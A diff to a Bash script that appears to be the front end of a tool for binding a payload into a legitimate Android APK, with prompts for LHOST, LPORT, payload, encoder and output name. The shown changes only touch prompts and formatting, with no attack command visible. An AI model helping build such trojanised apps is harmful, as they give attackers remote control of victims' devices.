@@ -64,17 +64,17 @@ printf "$C [Set]$G LEGITIM .APK$W"
 #	while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
 #		printf "\n$R[W] O-ops!! Please set a payload$W\n"
 #	done
-#printf "$C [Set]$G LOCAL HOST$W"
-#        while read -p " >> " LHOST && [ -z $LHOST ]; do
-#                printf "$R\n[W] O-ops!! Please set a host$W\n"
-#	done
+printf "$C [Set]$G LOCAL HOST($LHOST)$W"
+        while read -p " >> " LHOST && [ -z $LHOST ]; do
+                printf "$R\n[W] O-ops!! Please set a host$W"
+	done
 printf "$C [Set]$G LOCAL PORT$W"
         while read -p " >> " LPORT && [ -z $LPORT ]; do
-                printf "$R\n[W] O-ops!! Please set a local port$W\n"
+                printf "$R\n[W] O-ops!! Please set a local port$W"
         done
 printf "$C [Set]$G NAMED YOUR .APK$W"
 	while read -p " >> " MYAPK && [ -z $MYAPK ]; do
-		printf "$R\n[W] O-ops!! Please set a name$W\n"
+		printf "$R\n[W] O-ops!! Please set a name$W"
 	done
 sleep 1
 	Check
@@ -83,13 +83,13 @@ Check() {
 	Banner
 	printf "$C [IbyC]$M Is the setting correct ?\n\n"
 	sleep 1
-printf "$Y	 [!]$G L-APK          =$W $APK \n"
-printf "$Y	 [!]$G PAYLOAD        =$W $PAYLOAD \n"
-printf "$Y	 [!]$G LHOST          =$W $LHOST \n"
-printf "$Y	 [!]$G LPORT          =$W $LPORT \n"
-printf "$Y       [!]$G INTERACTIONS   =$W $INTER \n"
-printf "$Y       [!]$G ENCODER        =$W $ENCODER \n"
-printf "$Y	 [!]$G YOUR APK       =$W $MYAPK \n"
+printf "$Y   [!]$G L-APK          =$W $APK \n"
+printf "$Y   [!]$G PAYLOAD        =$W $PAYLOAD \n"
+printf "$Y   [!]$G LHOST          =$W $LHOST \n"
+printf "$Y   [!]$G LPORT          =$W $LPORT \n"
+printf "$Y   [!]$G INTERACTIONS   =$W $INTER \n"
+printf "$Y   [!]$G ENCODER        =$W $ENCODER \n"
+printf "$Y   [!]$G YOUR APK       =$W $MYAPK \n"
 echo 
 	while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
 		printf "$R\n[W] O-ops!! Please answer the question$W\n\n"
